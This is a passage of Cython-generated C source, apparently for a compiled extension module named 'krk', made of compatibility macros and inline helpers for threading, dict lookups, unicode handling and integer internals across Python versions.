  #define __Pyx_PyVectorcall_NARGS(n)  PyVectorcall_NARGS((size_t)(n))
#elif CYTHON_BACKPORT_VECTORCALL
  typedef PyObject *(*__pyx_vectorcallfunc)(PyObject *callable, PyObject *const *args,
                                            size_t nargsf, PyObject *kwnames);
  #define __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET  ((size_t)1 << (8 * sizeof(size_t) - 1))
  #define __Pyx_PyVectorcall_NARGS(n)  ((Py_ssize_t)(((size_t)(n)) & ~__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET))
#else
  #define __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET  0
  #define __Pyx_PyVectorcall_NARGS(n)  ((Py_ssize_t)(n))
#endif
#if PY_VERSION_HEX < 0x030900B1
  #define __Pyx_PyType_FromModuleAndSpec(m, s, b)  ((void)m, PyType_FromSpecWithBases(s, b))
  typedef PyObject *(*__Pyx_PyCMethod)(PyObject *, PyTypeObject *, PyObject *const *, size_t, PyObject *);
#else
  #define __Pyx_PyType_FromModuleAndSpec(m, s, b)  PyType_FromModuleAndSpec(m, s, b)
  #define __Pyx_PyCMethod  PyCMethod
#endif
#ifndef METH_METHOD
  #define METH_METHOD 0x200
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_LIMITED_API
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if CYTHON_COMPILING_IN_LIMITED_API
  #define __Pyx_PyThreadState_Current PyThreadState_Get()
#elif !CYTHON_FAST_THREAD_STATE
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if CYTHON_COMPILING_IN_LIMITED_API
static CYTHON_INLINE void *__Pyx_PyModule_GetState(PyObject *op)
{
    void *result;
    result = PyModule_GetState(op);
    if (!result)
        Py_FatalError("Couldn't find the module state");
    return result;
}
#endif
#define __Pyx_PyObject_GetSlot(obj, name, func_ctype)  __Pyx_PyType_GetSlot(Py_TYPE(obj), name, func_ctype)
#if CYTHON_COMPILING_IN_LIMITED_API
  #define __Pyx_PyType_GetSlot(type, name, func_ctype)  ((func_ctype) PyType_GetSlot((type), Py_##name))
#else
  #define __Pyx_PyType_GetSlot(type, name, func_ctype)  ((type)->name)
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if PY_MAJOR_VERSION < 3
    #if CYTHON_COMPILING_IN_PYPY
        #if PYPY_VERSION_NUM < 0x07030600
            #if defined(__cplusplus) && __cplusplus >= 201402L
                [[deprecated("`with nogil:` inside a nogil function will not release the GIL in PyPy2 < 7.3.6")]]
            #elif defined(__GNUC__) || defined(__clang__)
                __attribute__ ((__deprecated__("`with nogil:` inside a nogil function will not release the GIL in PyPy2 < 7.3.6")))
            #elif defined(_MSC_VER)
                __declspec(deprecated("`with nogil:` inside a nogil function will not release the GIL in PyPy2 < 7.3.6"))
            #endif
            static CYTHON_INLINE int PyGILState_Check(void) {
                return 0;
            }
        #else  // PYPY_VERSION_NUM < 0x07030600
        #endif  // PYPY_VERSION_NUM < 0x07030600
    #else
        static CYTHON_INLINE int PyGILState_Check(void) {
            PyThreadState * tstate = _PyThreadState_Current;
            return tstate && (tstate == PyGILState_GetThisThreadState());
        }
    #endif
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX > 0x030600B4 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStrWithError(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
static CYTHON_INLINE PyObject * __Pyx_PyDict_GetItemStr(PyObject *dict, PyObject *name) {
    PyObject *res = __Pyx_PyDict_GetItemStrWithError(dict, name);
    if (res == NULL) PyErr_Clear();
    return res;
}
#elif PY_MAJOR_VERSION >= 3 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07020000)
#define __Pyx_PyDict_GetItemStrWithError  PyDict_GetItemWithError
#define __Pyx_PyDict_GetItemStr           PyDict_GetItem
#else
static CYTHON_INLINE PyObject * __Pyx_PyDict_GetItemStrWithError(PyObject *dict, PyObject *name) {
#if CYTHON_COMPILING_IN_PYPY
    return PyDict_GetItem(dict, name);
#else
    PyDictEntry *ep;
    PyDictObject *mp = (PyDictObject*) dict;
    long hash = ((PyStringObject *) name)->ob_shash;
    assert(hash != -1);
    ep = (mp->ma_lookup)(mp, name, hash);
    if (ep == NULL) {
        return NULL;
    }
    return ep->me_value;
#endif
}
#define __Pyx_PyDict_GetItemStr           PyDict_GetItem
#endif
#if CYTHON_USE_TYPE_SLOTS
  #define __Pyx_PyType_GetFlags(tp)   (((PyTypeObject *)tp)->tp_flags)
  #define __Pyx_PyType_HasFeature(type, feature)  ((__Pyx_PyType_GetFlags(type) & (feature)) != 0)
  #define __Pyx_PyObject_GetIterNextFunc(obj)  (Py_TYPE(obj)->tp_iternext)
#else
  #define __Pyx_PyType_GetFlags(tp)   (PyType_GetFlags((PyTypeObject *)tp))
  #define __Pyx_PyType_HasFeature(type, feature)  PyType_HasFeature(type, feature)
  #define __Pyx_PyObject_GetIterNextFunc(obj)  PyIter_Next
#endif
#if CYTHON_USE_TYPE_SPECS && PY_VERSION_HEX >= 0x03080000
#define __Pyx_PyHeapTypeObject_GC_Del(obj)  {\
    PyTypeObject *type = Py_TYPE(obj);\
    assert(__Pyx_PyType_HasFeature(type, Py_TPFLAGS_HEAPTYPE));\
    PyObject_GC_Del(obj);\
    Py_DECREF(type);\
}
#else
#define __Pyx_PyHeapTypeObject_GC_Del(obj)  PyObject_GC_Del(obj)
#endif
#if CYTHON_COMPILING_IN_LIMITED_API
  #define CYTHON_PEP393_ENABLED 1
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GetLength(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_ReadChar(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((void)u, 1114111U)
  #define __Pyx_PyUnicode_KIND(u)         ((void)u, (0))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)u)
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)k, PyUnicode_ReadChar((PyObject*)(d), i))
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GetLength(u))
#elif PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         ((int)PyUnicode_KIND(u))
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, (Py_UCS4) ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535U : 1114111U)
  #define __Pyx_PyUnicode_KIND(u)         ((int)sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = (Py_UNICODE) ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #if !defined(PyUnicode_DecodeUnicodeEscape)
    #define PyUnicode_DecodeUnicodeEscape(s, size, errors)  PyUnicode_Decode(s, size, "unicode_escape", errors)
  #endif
  #if !defined(PyUnicode_Contains) || (PY_MAJOR_VERSION == 2 && PYPY_VERSION_NUM < 0x07030500)
    #undef PyUnicode_Contains
    #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
  #endif
  #if !defined(PyByteArray_Check)
    #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
  #endif
  #if !defined(PyObject_Format)
    #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
  #endif
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#if CYTHON_COMPILING_IN_CPYTHON
  #define __Pyx_PySequence_ListKeepNew(obj)\
    (likely(PyList_CheckExact(obj) && Py_REFCNT(obj) == 1) ? __Pyx_NewRef(obj) : PySequence_List(obj))
#else
  #define __Pyx_PySequence_ListKeepNew(obj)  PySequence_List(obj)
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        __Pyx_IS_TYPE(obj, &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define __Pyx_Py3Int_Check(op)       PyLong_Check(op)
  #define __Pyx_Py3Int_CheckExact(op)  PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#else
  #define __Pyx_Py3Int_Check(op)       (PyLong_Check(op) || PyInt_Check(op))
  #define __Pyx_Py3Int_CheckExact(op)  (PyLong_CheckExact(op) || PyInt_CheckExact(op))
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifdef CYTHON_EXTERN_C
    #undef __PYX_EXTERN_C
    #define __PYX_EXTERN_C CYTHON_EXTERN_C
#elif defined(__PYX_EXTERN_C)
    #ifdef _MSC_VER
    #pragma message ("Please do not define the '__PYX_EXTERN_C' macro externally. Use 'CYTHON_EXTERN_C' instead.")
    #else
    #warning Please do not define the '__PYX_EXTERN_C' macro externally. Use 'CYTHON_EXTERN_C' instead.
    #endif
#else
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__krk
#define __PYX_HAVE_API__krk
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*)(__pyx_uintptr_t) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*)(__pyx_uintptr_t) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*)(__pyx_uintptr_t) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
#if CYTHON_COMPILING_IN_LIMITED_API
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const wchar_t *u)
{
    const wchar_t *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#else
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u)
{
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#endif
#define __Pyx_PyUnicode_FromOrdinal(o)       PyUnicode_FromOrdinal((int)o)
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_VERSION_HEX >= 0x030C00A7
  #ifndef _PyLong_SIGN_MASK
    #define _PyLong_SIGN_MASK 3
  #endif
  #ifndef _PyLong_NON_SIZE_BITS
    #define _PyLong_NON_SIZE_BITS 3
  #endif
  #define __Pyx_PyLong_Sign(x)  (((PyLongObject*)x)->long_value.lv_tag & _PyLong_SIGN_MASK)
  #define __Pyx_PyLong_IsNeg(x)  ((__Pyx_PyLong_Sign(x) & 2) != 0)
  #define __Pyx_PyLong_IsNonNeg(x)  (!__Pyx_PyLong_IsNeg(x))
  #define __Pyx_PyLong_IsZero(x)  (__Pyx_PyLong_Sign(x) & 1)
  #define __Pyx_PyLong_IsPos(x)  (__Pyx_PyLong_Sign(x) == 0)
  #define __Pyx_PyLong_CompactValueUnsigned(x)  (__Pyx_PyLong_Digits(x)[0])
  #define __Pyx_PyLong_DigitCount(x)  ((Py_ssize_t) (((PyLongObject*)x)->long_value.lv_tag >> _PyLong_NON_SIZE_BITS))
  #define __Pyx_PyLong_SignedDigitCount(x)\
        ((1 - (Py_ssize_t) __Pyx_PyLong_Sign(x)) * __Pyx_PyLong_DigitCount(x))
  #if defined(PyUnstable_Long_IsCompact) && defined(PyUnstable_Long_CompactValue)
    #define __Pyx_PyLong_IsCompact(x)     PyUnstable_Long_IsCompact((PyLongObject*) x)
    #define __Pyx_PyLong_CompactValue(x)  PyUnstable_Long_CompactValue((PyLongObject*) x)
  #else
    #define __Pyx_PyLong_IsCompact(x)     (((PyLongObject*)x)->long_value.lv_tag < (2 << _PyLong_NON_SIZE_BITS))
    #define __Pyx_PyLong_CompactValue(x)  ((1 - (Py_ssize_t) __Pyx_PyLong_Sign(x)) * (Py_ssize_t) __Pyx_PyLong_Digits(x)[0])
  #endif
  typedef Py_ssize_t  __Pyx_compact_pylong;
  typedef size_t  __Pyx_compact_upylong;
  #else  // Py < 3.12
  #define __Pyx_PyLong_IsNeg(x)  (Py_SIZE(x) < 0)
  #define __Pyx_PyLong_IsNonNeg(x)  (Py_SIZE(x) >= 0)
  #define __Pyx_PyLong_IsZero(x)  (Py_SIZE(x) == 0)
  #define __Pyx_PyLong_IsPos(x)  (Py_SIZE(x) > 0)
  #define __Pyx_PyLong_CompactValueUnsigned(x)  ((Py_SIZE(x) == 0) ? 0 : __Pyx_PyLong_Digits(x)[0])
  #define __Pyx_PyLong_DigitCount(x)  __Pyx_sst_abs(Py_SIZE(x))
  #define __Pyx_PyLong_SignedDigitCount(x)  Py_SIZE(x)
  #define __Pyx_PyLong_IsCompact(x)  (Py_SIZE(x) == 0 || Py_SIZE(x) == 1 || Py_SIZE(x) == -1)
  #define __Pyx_PyLong_CompactValue(x)\
        ((Py_SIZE(x) == 0) ? (sdigit) 0 : ((Py_SIZE(x) < 0) ? -(sdigit)__Pyx_PyLong_Digits(x)[0] : (sdigit)__Pyx_PyLong_Digits(x)[0]))
  typedef sdigit  __Pyx_compact_pylong;
  typedef digit  __Pyx_compact_upylong;
  #endif
  #if PY_VERSION_HEX >= 0x030C00A5
